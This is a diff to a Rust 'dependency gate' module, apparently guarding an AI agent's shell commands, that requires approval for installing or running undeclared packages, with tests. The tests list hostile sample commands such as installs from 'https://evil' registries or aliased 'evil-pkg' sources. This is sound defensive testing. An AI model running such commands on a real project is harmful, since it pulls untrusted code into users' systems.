@@ -1,68 +1,119 @@
 // SPDX-License-Identifier: Apache-2.0
-//! C6: the dependency gate. A `Bash` command that installs a package the
-//! project does not already declare needs approval (the command guard's
+//! C6: the dependency gate. A `Bash` command that installs or runs a package
+//! the project does not already declare needs approval (the command guard's
 //! `NeedsApproval`), with a reason naming the package.
 //!
 //! `origin_cmdparse::installs` finds the installs (through wrappers, `bash -c`
 //! and chains); this module checks each named package against the manifests
-//! from the command's working directory up to the workspace root. A package
-//! from a URL, repository, tarball or path, a global install, and a manifest
-//! that is missing or cannot be parsed all need approval (fail closed).
+//! from the command's (canonical) working directory up to the workspace root.
+//! Always needing approval: a package from a URL, repository, tarball or path
+//! (also written in the version slot, `x@npm:y`), a global install, another
+//! index or registry, packages supplied at run time, a working directory that
+//! cannot be resolved or lies outside the workspace, and a manifest that is
+//! missing, over 1 MB or cannot be parsed (fail closed). `npx`/`npm exec` of a
+//! binary already in `node_modules/.bin` is local and passes.
 
 use std::collections::{HashMap, HashSet};
-use std::path::{Component, Path, PathBuf};
+use std::path::{Path, PathBuf};
 
-use origin_cmdparse::Ecosystem;
+use origin_cmdparse::{Ecosystem, Form};
+
+/// Manifests larger than this are treated as unparsable.
+const MAX_MANIFEST_BYTES: u64 = 1024 * 1024;
 
 /// Why `cmd`, run in `cwd` (relative to `root`, the workspace root) needs
-/// approval as an install of undeclared packages; `None` when it installs
-/// nothing new.
+/// approval as an install or run of undeclared packages; `None` when it
+/// installs nothing new.
 #[must_use]
 pub fn reason(cmd: &str, cwd: Option<&str>, root: &Path) -> Option<String> {
     let installs = origin_cmdparse::installs(cmd);
     if installs.is_empty() {
         return None;
     }
-    let dir = cwd.map_or_else(|| root.to_path_buf(), |c| root.join(c));
+    let dirs = workspace_dirs(cwd, root);
     let mut declared: HashMap<Ecosystem, Result<HashSet<String>, String>> = HashMap::new();
     let mut flagged: Vec<String> = Vec::new();
     for ins in &installs {
-        for pkg in &ins.packages {
-            // `pip install .`, `go get ./...`: the project itself, not a dependency.
-            if pkg == "." || (ins.ecosystem == Ecosystem::Go && pkg.starts_with('.')) {
-                continue;
+        // `pip install .`, `go get ./...`: the project itself, not a dependency.
+        let named: Vec<&str> = ins
+            .packages
+            .iter()
+            .map(String::as_str)
+            .filter(|p| *p != "." && !(ins.ecosystem == Ecosystem::Go && p.starts_with('.')))
+            .collect();
+        if let Some(why) = &ins.always_ask {
+            if ins.packages.is_empty() {
+                flagged.push(format!("packages ({why})"));
+            } else if !named.is_empty() {
+                flagged.push(format!("{} ({why})", named.join(", ")));
             }
-            if ins.global {
-                flagged.push(format!("{pkg} (global install)"));
-                continue;
-            }
+            continue;
+        }
+        for pkg in named {
             if unknown_source(ins.ecosystem, pkg) {
                 flagged.push(format!("{pkg} (from a URL, repository or path)"));
                 continue;
             }
             let name = package_name(ins.ecosystem, pkg);
-            let names = declared
-                .entry(ins.ecosystem)
-                .or_insert_with(|| declared_packages(ins.ecosystem, &dir, root));
-            match names {
+            let known = declared.entry(ins.ecosystem).or_insert_with(|| {
+                let (dir, root) = dirs.as_ref().map_err(Clone::clone)?;
+                declared_packages(ins.ecosystem, dir, root)
+            });
+            let local = || {
+                ins.form == Form::ExecLocal
+                    && dirs.as_ref().is_ok_and(|(dir, root)| local_bin(&name, dir, root))
+            };
+            match known {
                 Ok(set) if set.contains(&name) => {}
-                Ok(_) => flagged.push(name),
+                _ if local() => {}
+                Ok(_) if ins.form == Form::Add => flagged.push(name),
+                Ok(_) => flagged.push(format!("{name} (runs a package from the registry)")),
                 Err(why) => flagged.push(format!("{name} ({why})")),
             }
         }
     }
     (!flagged.is_empty()).then(|| {
         format!(
-            "installs a package the project does not declare: {}",
+            "installs or runs a package the project does not declare: {}",
             flagged.join(", ")
         )
     })
 }
 
+/// The canonical working directory and workspace root. `Err` when either
+/// cannot be resolved or the directory is outside the root (a symlinked or
+/// `..` `cwd`).
+fn workspace_dirs(cwd: Option<&str>, root: &Path) -> Result<(PathBuf, PathBuf), String> {
+    let root = std::fs::canonicalize(root).map_err(|e| format!("workspace root cannot be resolved: {e}"))?;
+    let dir = cwd.map_or_else(|| root.clone(), |c| root.join(c));
+    let dir =
+        std::fs::canonicalize(&dir).map_err(|e| format!("working directory cannot be resolved: {e}"))?;
+    if dir.starts_with(&root) {
+        Ok((dir, root))
+    } else {
+        Err("working directory is outside the workspace".into())
+    }
+}
+
+/// `node_modules/.bin/<bin>` (or `<bin>.cmd`) exists from `dir` up to `root`.
+fn local_bin(name: &str, dir: &Path, root: &Path) -> bool {
+    let bin = name.rsplit('/').next().unwrap_or(name);
+    dir.ancestors().take_while(|d| d.starts_with(root)).any(|d| {
+        let b = d.join("node_modules").join(".bin");
+        b.join(bin).is_file() || b.join(format!("{bin}.cmd")).is_file()
+    })
+}
+
 /// A package argument that is not a registry name: a URL, VCS spec, path,
-/// tarball or wheel (npm `user/repo` is GitHub shorthand).
+/// tarball or wheel (npm `user/repo` is GitHub shorthand), also when written
+/// in the version slot (`react@npm:other`, `@types/node@github:x/y`).
 fn unknown_source(eco: Ecosystem, pkg: &str) -> bool {
     let a = pkg.to_ascii_lowercase();
+    let version = match eco {
+        Ecosystem::Npm => a.strip_prefix('@').unwrap_or(&a).split_once('@'),
+        Ecosystem::Cargo | Ecosystem::Go => a.split_once('@'),
+        Ecosystem::Python => None,
+    };
     a.contains("://")
         || ["git+", "git@", "git:", "github:", "file:", "link:"]
             .iter()
@@ -72,13 +123,13 @@ fn unknown_source(eco: Ecosystem, pkg: &str) -> bool {
         || [".tgz", ".tar.gz", ".tar", ".zip", ".whl"]
             .iter()
             .any(|s| a.ends_with(s))
+        || version.is_some_and(|(_, v)| v.contains([':', '/']))
         || match eco {
-            Ecosystem::Npm => !a.starts_with('@') && a.contains('/'),
+            Ecosystem::Npm => !a.starts_with('@') && a.split('@').next().is_some_and(|n| n.contains('/')),
             Ecosystem::Go => a.contains('\\'),
             Ecosystem::Cargo | Ecosystem::Python => a.contains(['/', '\\']),
         }
 }
-
 /// The package name with its version / extras stripped (`left-pad@1.2.3`,
 /// `@scope/name@^2`, `serde@1`, `requests[socks]>=2`, `example.com/mod@v1`).
 fn package_name(eco: Ecosystem, pkg: &str) -> String {
@@ -113,17 +164,18 @@ fn pep503(req: &str) -> String {
 /// Every package declared for `eco` in the manifests from `dir` up to `root`.
 /// `Err` when none exists or one cannot be read or parsed.
 fn declared_packages(eco: Ecosystem, dir: &Path, root: &Path) -> Result<HashSet<String>, String> {
-    if dir.components().any(|c| c == Component::ParentDir) {
-        return Err("working directory is outside the workspace".into());
-    }
     let mut names = HashSet::new();
     let mut found = false;
     for d in dir.ancestors().take_while(|d| d.starts_with(root)) {
         for f in manifest_files(eco, d) {
-            let text = match std::fs::read_to_string(&f) {
-                Ok(t) => t,
+            let text = match std::fs::metadata(&f) {
                 Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
-                Err(e) => return Err(format!("cannot read {}: {e}", file_name(&f))),
+                Ok(m) if m.len() > MAX_MANIFEST_BYTES => {
+                    return Err(format!("{} is over 1 MB", file_name(&f)));
+                }
+                _ => {
+                    std::fs::read_to_string(&f).map_err(|e| format!("cannot read {}: {e}", file_name(&f)))?
+                }
             };
             found = true;
             parse_manifest(eco, &f, &text, &mut names)
@@ -376,5 +428,115 @@ mod tests {
             reason("cargo add serde", Some(".."), d.path()).is_some(),
             "cwd outside root"
         );
+        // M2: an oversized manifest is treated as unparsable.
+        std::fs::write(
+            d.path().join("Cargo.toml"),
+            format!("[dependencies]\nserde = \"1\"\n{}", "# pad\n".repeat(200_000)),
+        )
+        .expect("write");
+        let r = gate(d.path(), "cargo add serde").expect("oversized manifest ⇒ fail closed");
+        assert!(r.contains("over 1 MB"), "{r}");
+    }
+
+    const PKG: &str =
+        r#"{"dependencies":{"react":"^18","eslint":"8"},"devDependencies":{"@types/node":"1"}}"#;
+
+    /// I3: a source written in the version slot is not "already declared".
+    #[test]
+    fn a_source_in_the_version_slot_needs_approval() {
+        let d = project(&[
+            ("package.json", PKG),
+            ("Cargo.toml", "[dependencies]\nserde = \"1\"\n"),
+        ]);
+        for cmd in [
+            "npm install react@npm:evil-pkg",
+            "npm install @types/node@github:evil/x",
+            "npm install react@file:vendor",
+            "cargo add serde@git:x/y",
+        ] {
+            assert!(gate(d.path(), cmd).is_some(), "{cmd}");
+        }
+        assert_eq!(gate(d.path(), "npm install react@^18.2.0 @types/node@20"), None);
+    }
+
+    /// I4 / S1 / S2: run-time lists, global installs and other indexes need
+    /// approval even for declared names.
+    #[test]
+    fn declared_names_still_need_approval_when_fetched_otherwise() {
+        let d = project(&[("package.json", PKG), ("requirements.txt", "requests\n")]);
+        for cmd in [
+            "xargs npm install < list.txt",
+            "echo react | xargs npm install",
+            "pip install -r https://x/req.txt",
+            "npm install --location=global react",
+            "uv pip install --system requests",
+            "yarn global add react",
+            "pip install --index-url https://evil requests",
+            "npm install --registry https://evil react",
+            "cargo install ripgrep",
+            "go install example.com/tool@v1.0.0",
+        ] {
+            let r = gate(d.path(), cmd).unwrap_or_default();
+            assert!(!r.is_empty(), "{cmd}");
+        }
+        assert_eq!(gate(d.path(), "pip install -r requirements.txt"), None);
+        assert_eq!(gate(d.path(), "go install ./cmd/x"), None, "local build");
+    }
+
+    /// S3: `npx`/`npm exec` run a local binary without asking; registry runs
+    /// need the package declared.
+    #[test]
+    fn run_from_registry_needs_a_local_binary_or_a_declared_package() {
+        let d = project(&[
+            ("package.json", PKG),
+            ("node_modules/.bin/tsc.cmd", ""),
+            ("pyproject.toml", "[project]\ndependencies = [\"ruff\"]\n"),
+            ("app/.keep", ""),
+        ]);
+        assert_eq!(
+            reason("npx tsc --noEmit", Some("app"), d.path()),
+            None,
+            "local bin, walked up"
+        );
+        assert_eq!(gate(d.path(), "npm exec eslint"), None, "declared");
+        assert_eq!(gate(d.path(), "npx --no-install cowsay"), None);
+        let r = gate(d.path(), "npx cowsay hi").expect("not local, not declared");
+        assert!(r.contains("cowsay"), "{r}");
+        assert!(gate(d.path(), "pnpm dlx tsc").is_some(), "dlx ignores local bins");
+        assert_eq!(gate(d.path(), "yarn dlx eslint"), None, "declared");
+        assert_eq!(gate(d.path(), "uvx ruff check"), None, "declared");
+        for cmd in ["bunx cowsay", "uvx black", "pipx run black"] {
+            assert!(gate(d.path(), cmd).is_some(), "{cmd}");
+        }
+    }
+
+    /// S4: `uv add` checks the Python manifest like `cargo add`.
+    #[test]
+    fn uv_add_checks_the_python_manifest() {
+        let d = project(&[("pyproject.toml", "[project]\ndependencies = [\"httpx>=0.27\"]\n")]);
+        assert_eq!(gate(d.path(), "uv add httpx"), None);
+        assert!(gate(d.path(), "uv add requests").is_some_and(|r| r.contains("requests")));
+    }
+
+    /// S5: the working directory is canonicalised before the walk.
+    #[test]
+    fn working_directory_must_resolve_inside_the_workspace() {
+        let outside = project(&[("package.json", r#"{"dependencies":{"left-pad":"1"}}"#)]);
+        let d = project(&[("package.json", PKG)]);
+        let r = reason("npm install react", Some("missing"), d.path()).expect("unresolvable");
+        assert!(r.contains("cannot be resolved"), "{r}");
+        let abs = outside.path().to_string_lossy().into_owned();
+        let r = reason("npm install left-pad", Some(&abs), d.path()).expect("outside");
+        assert!(r.contains("outside the workspace"), "{r}");
+        // A symlinked cwd pointing outside (when this host lets us create one).
+        let link = d.path().join("link");
+        #[cfg(unix)]
+        let made = std::os::unix::fs::symlink(outside.path(), &link).is_ok();
+        #[cfg(windows)]
+        let made = std::os::windows::fs::symlink_dir(outside.path(), &link).is_ok();
+        if made {
+            let r = reason("npm install left-pad", Some("link"), d.path()).expect("symlink outside");
+            assert!(r.contains("outside the workspace"), "{r}");
+        }
     }
 }
